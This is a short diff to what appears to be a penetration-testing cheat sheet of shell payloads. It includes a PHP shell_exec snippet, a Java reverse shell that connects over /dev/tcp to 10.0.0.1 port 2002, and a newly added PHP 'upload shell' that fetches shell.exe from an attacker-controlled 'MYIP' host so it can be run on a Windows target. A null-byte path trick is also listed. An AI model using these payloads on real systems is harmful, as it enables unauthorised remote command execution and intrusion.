@@ -1,4 +1,4 @@
-RFI/LFI
+PHP Shell Commands:
 <?php 
 echo shell_exec(“ls -la“);
 ?>  
@@ -48,6 +48,12 @@ Java:
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
+
+PHP Upload shell (I have encountered a Windows machine that allowed me to write php script. The windows machine did not have any file trasnfer shell command such as "wget" or "fetch". Depending on php, the ticks may be important to change ' " ', ' ' '):
+<? php
+file_put_contents("shell.exe", fopen("http://MYIP/temp/shell.exe", "r"));
+?>
+Then I would use execute shell commnad, exampled above to execute the file.
 
 null:
 path%00
